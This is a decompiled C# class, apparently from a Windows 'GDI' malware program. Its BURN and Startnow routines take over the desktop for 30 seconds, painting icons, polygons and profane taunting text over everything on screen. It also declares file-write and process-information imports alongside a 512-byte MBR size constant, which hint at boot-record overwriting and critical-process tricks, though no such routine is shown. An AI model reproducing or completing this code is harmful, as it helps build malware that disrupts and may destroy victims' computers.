using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ṧ
{
	// Token: 0x0200000B RID: 11
	internal class GDI
	{
		// Token: 0x06000068 RID: 104
		[DllImport("Shell32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, EntryPoint = "ExtractIconExW", ExactSpelling = true)]
		private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);

		// Token: 0x06000069 RID: 105
		[DllImport("user32.dll", SetLastError = true)]
		private static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x0600006A RID: 106
		[DllImport("gdi32.dll", SetLastError = true)]
		private static extern IntPtr CreateCompatibleDC(IntPtr hdc);

		// Token: 0x0600006B RID: 107
		[DllImport("gdi32.dll")]
		public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

		// Token: 0x0600006C RID: 108
		[DllImport("gdi32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool DeleteObject(IntPtr hObject);

		// Token: 0x0600006D RID: 109
		[DllImport("gdi32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool BitBlt(IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, GDI.TernaryRasterOperations dwRop);

		// Token: 0x0600006E RID: 110
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);

		// Token: 0x0600006F RID: 111
		[DllImport("gdi32.dll")]
		private static extern bool Rectangle(IntPtr hdc, int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

		// Token: 0x06000070 RID: 112
		[DllImport("user32.dll")]
		private static extern IntPtr GetDesktopWindow();

		// Token: 0x06000071 RID: 113
		[DllImport("user32.dll")]
		private static extern IntPtr GetWindowDC(IntPtr hwnd);

		// Token: 0x06000072 RID: 114
		[DllImport("user32.dll")]
		private static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

		// Token: 0x06000073 RID: 115
		[DllImport("user32.dll")]
		private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

		// Token: 0x06000074 RID: 116
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateSolidBrush(int crColor);

		// Token: 0x06000075 RID: 117
		[DllImport("gdi32.dll", EntryPoint = "GdiAlphaBlend")]
		public static extern bool AlphaBlend(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, GDI.BLENDFUNCTION blendFunction);

		// Token: 0x06000076 RID: 118
		[DllImport("gdi32.dll")]
		private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, GDI.TernaryRasterOperations dwRop);

		// Token: 0x06000077 RID: 119
		[DllImport("gdi32.dll")]
		private static extern bool PlgBlt(IntPtr hdcDest, GDI.POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

		// Token: 0x06000078 RID: 120
		[DllImport("gdi32.dll")]
		private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, GDI.TernaryRasterOperations dwRop);

		// Token: 0x06000079 RID: 121
		[DllImport("gdi32.dll")]
		public static extern bool DeleteDC(IntPtr hdc);

		// Token: 0x0600007A RID: 122
		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

		// Token: 0x0600007B RID: 123
		[DllImport("kernel32")]
		private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

		// Token: 0x0600007C RID: 124
		[DllImport("ntdll.dll", SetLastError = true)]
		private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

		// Token: 0x0600007D RID: 125
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool CloseHandle(IntPtr hHandle);

		// Token: 0x0600007E RID: 126 RVA: 0x00002DE4 File Offset: 0x00000FE4
		public static Icon Extract(string file, int number, bool largeIcon)
		{
			IntPtr intPtr;
			IntPtr intPtr2;
			GDI.ExtractIconEx(file, number, out intPtr, out intPtr2, 1);
			Icon result;
			try
			{
				result = Icon.FromHandle(largeIcon ? intPtr : intPtr2);
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00002E28 File Offset: 0x00001028
		public static void BURN()
		{
			Thread.Sleep(50);
			DateTime now = DateTime.Now;
			TimeSpan t = TimeSpan.FromSeconds(30.0);
			Random random = new Random();
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			int left = Screen.PrimaryScreen.Bounds.Left;
			int top = Screen.PrimaryScreen.Bounds.Top;
			int num = 80;
			while (DateTime.Now - now < t)
			{
				IntPtr desktopWindow = GDI.GetDesktopWindow();
				IntPtr windowDC = GDI.GetWindowDC(desktopWindow);
				for (int i = 0; i < height; i += num)
				{
					for (int j = 0; j < width; j += num)
					{
					}
				}
				for (int k = 0; k < 10; k++)
				{
					int num2 = random.Next(left, width - 64);
					int num3 = random.Next(top, height - 64);
					switch (random.Next(4))
					{
					case 0:
						GDI.DrawIconEx(windowDC, num2, num3, SystemIcons.Warning.Handle, 48, 48, 0, IntPtr.Zero, 3);
						break;
					case 1:
						GDI.DrawIconEx(windowDC, num2, num3, SystemIcons.Error.Handle, 48, 48, 0, IntPtr.Zero, 3);
						break;
					case 2:
					{
						GDI.POINT[] array = new GDI.POINT[]
						{
							new GDI.POINT(num2 + 24, num3),
							new GDI.POINT(num2, num3 + 48),
							new GDI.POINT(num2 + 48, num3 + 48)
						};
						IntPtr intPtr = GDI.CreateSolidBrush(ColorTranslator.ToWin32(Color.Black));
						GDI.SelectObject(windowDC, intPtr);
						GDI.Polygon(windowDC, array, array.Length);
						GDI.DeleteObject(intPtr);
						break;
					}
					case 3:
						using (Graphics graphics = Graphics.FromHdc(windowDC))
						{
							string[] array2 = new string[]
							{
								"???",
								"FJCKING SafeSystem",
								"×ñ¥☼¥☼◙ñ¥",
								"सिस्टमफक",
								"너는그것을후회했어"
							};
							string s = array2[random.Next(array2.Length)];
							Font font = new Font("Arial", (float)random.Next(16, 32), FontStyle.Bold | FontStyle.Italic);
							Brush brush = new SolidBrush(Color.FromArgb(random.Next(256), random.Next(256), random.Next(256)));
							graphics.TranslateTransform((float)(num2 + random.Next(-10, 10)), (float)(num3 + random.Next(-10, 10)));
							graphics.RotateTransform((float)random.Next(-30, 30));
							graphics.DrawString(s, font, brush, 0f, 0f);
							graphics.ResetTransform();
							font.Dispose();
							brush.Dispose();
						}
						break;
					}
				}
				GDI.ReleaseDC(desktopWindow, windowDC);
				Thread.Sleep(120);
			}
		}

		// Token: 0x06000080 RID: 128 RVA: 0x0000316C File Offset: 0x0000136C
		internal static void Startnow()
		{
			Thread.Sleep(50);
			DateTime now = DateTime.Now;
			TimeSpan t = TimeSpan.FromSeconds(30.0);
			Random random = new Random();
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			int left = Screen.PrimaryScreen.Bounds.Left;
			int top = Screen.PrimaryScreen.Bounds.Top;
			Color[] array = new Color[]
			{
				Color.Red,
				Color.Black,
				Color.Orange
			};
			int num = 0;
			while (DateTime.Now - now < t)
			{
				IntPtr desktopWindow = GDI.GetDesktopWindow();
				IntPtr windowDC = GDI.GetWindowDC(desktopWindow);
				GDI.POINT[] array2 = new GDI.POINT[]
				{
					new GDI.POINT(random.Next(left, width), random.Next(top, height)),
					new GDI.POINT(random.Next(left, width), random.Next(top, height)),
					new GDI.POINT(random.Next(left, width), random.Next(top, height))
				};
				IntPtr intPtr = GDI.CreateSolidBrush(ColorTranslator.ToWin32(array[num]));
				GDI.SelectObject(windowDC, intPtr);
				GDI.Polygon(windowDC, array2, array2.Length);
				GDI.DeleteObject(intPtr);
				GDI.ReleaseDC(desktopWindow, windowDC);
				num = (num + 1) % array.Length;
				Thread.Sleep(100);
			}
		}

		// Token: 0x06000081 RID: 129
		[DllImport("gdi32.dll")]
		private static extern bool Polygon(IntPtr hdc, [In] GDI.POINT[] lpPoints, int nCount);

		// Token: 0x06000082 RID: 130
		[DllImport("user32.dll")]
		private static extern bool DrawIconEx(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon, int cxWidth, int cyWidth, int istepIfAniCur, IntPtr hbrFlickerFreeDraw, int diFlags);

		// Token: 0x06000083 RID: 131
		[DllImport("user32.dll")]
		private static extern int FillRect(IntPtr hDC, [In] ref RECT lprc, IntPtr hbr);

		// Token: 0x0400001D RID: 29
		private const uint GenericRead = 2147483648U;

		// Token: 0x0400001E RID: 30
		private const uint GenericWrite = 1073741824U;

		// Token: 0x0400001F RID: 31
		private const uint GenericExecute = 536870912U;

		// Token: 0x04000020 RID: 32
		private const uint GenericAll = 268435456U;

		// Token: 0x04000021 RID: 33
		private const uint FileShareRead = 1U;

		// Token: 0x04000022 RID: 34
		private const uint FileShareWrite = 2U;

		// Token: 0x04000023 RID: 35
		private const uint OpenExisting = 3U;

		// Token: 0x04000024 RID: 36
		private const uint FileFlagDeleteOnClose = 67108864U;

		// Token: 0x04000025 RID: 37
		private const uint MbrSize = 512U;

		// Token: 0x04000026 RID: 38
		private const int AC_SRC_OVER = 0;

		// Token: 0x04000027 RID: 39
		private const int AC_SRC_ALPHA = 1;

		// Token: 0x0200002F RID: 47
		private enum TernaryRasterOperations : uint
		{
			// Token: 0x040000CF RID: 207
			SRCCOPY = 13369376U,
			// Token: 0x040000D0 RID: 208
			SRCPAINT = 15597702U,
			// Token: 0x040000D1 RID: 209
			SRCAND = 8913094U,
			// Token: 0x040000D2 RID: 210
			SRCINVERT = 6684742U,
			// Token: 0x040000D3 RID: 211
			SRCERASE = 4457256U,
			// Token: 0x040000D4 RID: 212
			NOTSRCCOPY = 3342344U,
			// Token: 0x040000D5 RID: 213
			NOTSRCERASE = 1114278U,
			// Token: 0x040000D6 RID: 214
			MERGECOPY = 12583114U,
			// Token: 0x040000D7 RID: 215
			MERGEPAINT = 12255782U,
			// Token: 0x040000D8 RID: 216
			PATCOPY = 15728673U,
			// Token: 0x040000D9 RID: 217
			PATPAINT = 16452105U,
			// Token: 0x040000DA RID: 218
			PATINVERT = 5898313U,
			// Token: 0x040000DB RID: 219
			DSTINVERT = 5570569U,
			// Token: 0x040000DC RID: 220
			BLACKNESS = 66U,
			// Token: 0x040000DD RID: 221
			WHITENESS = 16711778U,
			// Token: 0x040000DE RID: 222
			CAPTUREBLT = 1073741824U
		}

		// Token: 0x02000030 RID: 48
		public struct POINT
		{
			// Token: 0x060000D3 RID: 211 RVA: 0x000041CA File Offset: 0x000023CA
			public POINT(int x, int y)
			{
				this.X = x;
				this.Y = y;
			}

			// Token: 0x060000D4 RID: 212 RVA: 0x000041DC File Offset: 0x000023DC
			public static implicit operator Point(GDI.POINT p)
			{
				return new Point(p.X, p.Y);
			}

			// Token: 0x060000D5 RID: 213 RVA: 0x00004200 File Offset: 0x00002400
			public static implicit operator GDI.POINT(Point p)
			{
				return new GDI.POINT(p.X, p.Y);
			}

			// Token: 0x040000DF RID: 223
			public int X;

			// Token: 0x040000E0 RID: 224
			public int Y;
		}

		// Token: 0x02000031 RID: 49
		public struct BLENDFUNCTION
		{
			// Token: 0x060000D6 RID: 214 RVA: 0x00004225 File Offset: 0x00002425
			public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
			{
				this.BlendOp = op;
				this.BlendFlags = flags;
				this.SourceConstantAlpha = alpha;
				this.AlphaFormat = format;
			}

			// Token: 0x040000E1 RID: 225
			private byte BlendOp;

			// Token: 0x040000E2 RID: 226
			private byte BlendFlags;

			// Token: 0x040000E3 RID: 227
			private byte SourceConstantAlpha;

			// Token: 0x040000E4 RID: 228
			private byte AlphaFormat;
		}
	}
}
